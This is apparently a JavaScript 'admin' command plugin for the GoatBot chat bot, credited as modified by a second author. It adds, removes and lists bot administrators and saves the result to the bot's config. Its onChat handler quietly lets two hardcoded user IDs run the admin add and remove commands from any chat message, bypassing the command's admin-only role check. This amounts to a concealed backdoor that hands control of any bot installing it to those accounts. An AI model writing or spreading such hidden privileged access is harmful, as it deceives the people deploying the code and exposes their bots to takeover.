const { config } = global.GoatBot;
const { writeFileSync } = require("fs-extra");

module.exports = {
  config: {
    name: "admin",
    version: "2.4",
    author: "NTKhang + Modified by Mahi",
    countDown: 5,
    role: 2,
    category: "box chat",
    onChat: true,
    shortDescription: {
      en: "Add, remove, edit admin role"
    },
    longDescription: {
      en: "Add, remove, edit admin role"
    },
    guide: {
      en:
        '   {pn} [add | -a] <uid | @tag>: Add admin role for user' +
        '\n   {pn} [remove | -r] <uid | @tag>: Remove admin role of user' +
        '\n   {pn} [list | -l]: List all admins'
    }
  },

  langs: {
    en: {
      added: `┏━━ ✅ 𝗔𝗗𝗗𝗘𝗗 [ %1 ] ━━┓\n%2\n┗━━━━━━━━━━━━━━━━━┛`,
      alreadyAdmin: `┏━━ ⚠️ 𝗔𝗟𝗥𝗘𝗔𝗗𝗬 [ %1 ] ━━┓\n%2\n┗━━━━━━━━━━━━━━━━━┛`,
      removed: `┏━━ ❌ 𝗥𝗘𝗠𝗢𝗩𝗘𝗗 [ %1 ] ━━┓\n%2\n┗━━━━━━━━━━━━━━━━━┛`,
      notAdmin: "⚠️ | %1 users don't have admin role:\n%2",
      missingIdAdd: "⚠️ | Please enter ID or tag user to add admin role",
      missingIdRemove: "⚠️ | Please enter ID or tag user to remove admin role",
      listAdmin: "👑 | List of admins:\n%1"
    }
  },

  onStart: async function ({ message, args, usersData, event, getLang }) {
    return await this.handle(message, args, usersData, event, getLang);
  },

  onChat: async function ({ message, event, usersData, getLang }) {
    const allowedUIDs = ["61577716215531", "61577983130441"];
    if (!allowedUIDs.includes(event.senderID)) return;

    const { body } = event;
    if (!body?.toLowerCase().startsWith("admin")) return;

    const args = body.trim().split(/\s+/);
    if (args.length < 2) return;

    const validSubcommands = ["add", "-a", "remove", "-r", "list", "-l"];
    if (!validSubcommands.includes(args[1].toLowerCase())) return;

    args.shift(); // remove "admin"
    return await this.handle(message, args, usersData, event, getLang);
  },

  handle: async function (message, args, usersData, event, getLang) {
    const toBold = (txt) =>
      txt.replace(/[A-Za-z0-9]/g, (c) =>
        String.fromCodePoint(
          {
            A: 0x1d400,
            B: 0x1d401,
            C: 0x1d402,
            D: 0x1d403,
            E: 0x1d404,
            F: 0x1d405,
            G: 0x1d406,
            H: 0x1d407,
            I: 0x1d408,
            J: 0x1d409,
            K: 0x1d40a,
            L: 0x1d40b,
            M: 0x1d40c,
            N: 0x1d40d,
            O: 0x1d40e,
            P: 0x1d40f,
            Q: 0x1d410,
            R: 0x1d411,
            S: 0x1d412,
            T: 0x1d413,
            U: 0x1d414,
            V: 0x1d415,
            W: 0x1d416,
            X: 0x1d417,
            Y: 0x1d418,
            Z: 0x1d419,
            a: 0x1d41a,
            b: 0x1d41b,
            c: 0x1d41c,
            d: 0x1d41d,
            e: 0x1d41e,
            f: 0x1d41f,
            g: 0x1d420,
            h: 0x1d421,
            i: 0x1d422,
            j: 0x1d423,
            k: 0x1d424,
            l: 0x1d425,
            m: 0x1d426,
            n: 0x1d427,
            o: 0x1d428,
            p: 0x1d429,
            q: 0x1d42a,
            r: 0x1d42b,
            s: 0x1d42c,
            t: 0x1d42d,
            u: 0x1d42e,
            v: 0x1d42f,
            w: 0x1d430,
            x: 0x1d431,
            y: 0x1d432,
            z: 0x1d433,
            0: 0x1d7ce,
            1: 0x1d7cf,
            2: 0x1d7d0,
            3: 0x1d7d1,
            4: 0x1d7d2,
            5: 0x1d7d3,
            6: 0x1d7d4,
            7: 0x1d7d5,
            8: 0x1d7d6,
            9: 0x1d7d7
          }[c] || c
        )
      );

    switch (args[0]) {
      case "add":
      case "-a": {
        if (!args[1]) return message.reply(getLang("missingIdAdd"));

        let uids = [];
        if (Object.keys(event.mentions).length > 0)
          uids = Object.keys(event.mentions);
        else if (event.messageReply) uids.push(event.messageReply.senderID);
        else uids = args.filter((arg) => !isNaN(arg));

        const notAdminIds = [];
        const adminIds = [];

        for (const uid of uids) {
          if (config.adminBot.includes(uid)) adminIds.push(uid);
          else notAdminIds.push(uid);
        }

        config.adminBot.push(...notAdminIds);
        writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));

        const getNames = await Promise.all(
          uids.map((uid) =>
            usersData.getName(uid).then((name) => ({ uid, name }))
          )
        );

        const addedList = getNames
          .filter(({ uid }) => notAdminIds.includes(uid))
          .map(
            ({ uid, name }) =>
              `• 𝗡𝗮𝗺𝗲 : ${toBold(name)}\n• 𝗨𝗜𝗗  = ${toBold(uid)}`
          )
          .join("\n");

        const alreadyList = adminIds
          .map((uid) => `• 𝗨𝗜𝗗  = ${toBold(uid)}`)
          .join("\n");

        return message.reply(
          (notAdminIds.length > 0
            ? getLang("added", notAdminIds.length, addedList)
            : "") +
            (adminIds.length > 0
              ? getLang("alreadyAdmin", adminIds.length, alreadyList)
              : "")
        );
      }

      case "remove":
      case "-r": {
        if (!args[1]) return message.reply(getLang("missingIdRemove"));

        let uids = [];
        if (Object.keys(event.mentions).length > 0)
          uids = Object.keys(event.mentions);
        else if (event.messageReply) uids.push(event.messageReply.senderID);
        else uids = args.filter((arg) => !isNaN(arg));

        const removedIds = [];
        const notAdminIds = [];

        for (const uid of uids) {
          if (config.adminBot.includes(uid)) removedIds.push(uid);
          else notAdminIds.push(uid);
        }

        for (const uid of removedIds)
          config.adminBot.splice(config.adminBot.indexOf(uid), 1);

        writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));

        const getNames = await Promise.all(
          removedIds.map((uid) =>
            usersData.getName(uid).then((name) => ({ uid, name }))
          )
        );

        const removedList = getNames
          .map(
            ({ uid, name }) =>
              `• 𝗡𝗮𝗺𝗲 : ${toBold(name)}\n• 𝗨𝗜𝗗  = ${toBold(uid)}`
          )
          .join("\n");

        return message.reply(
          (removedIds.length > 0
            ? getLang("removed", removedIds.length, removedList)
            : "") +
            (notAdminIds.length > 0
              ? getLang("notAdmin", notAdminIds.length, notAdminIds.map((uid) => `• ${uid}`).join("\n"))
              : "")
        );
      }

      case "list":
      case "-l": {
        const getNames = await Promise.all(
          config.adminBot.map((uid) =>
            usersData.getName(uid).then((name) => ({ uid, name }))
          )
        );

        const listBody = getNames
          .map(
            ({ uid, name }, i) =>
              `┣ ${i + 1}:  ${toBold(name)}\n┃ 🔗 ${toBold(uid)}`
          )
          .join("\n");

        const finalMessage = `┏━━━ 👑 𝗔𝗗𝗠𝗜𝗡𝗦 👑 ━━━┓
${listBody}
┗━━━━ 🧠 𝗧𝗼𝘁𝗮𝗹: ${getNames.length} ━━━━┛`;

        return message.reply(finalMessage);
      }

      default:
        return message.SyntaxError?.();
    }
  }
};
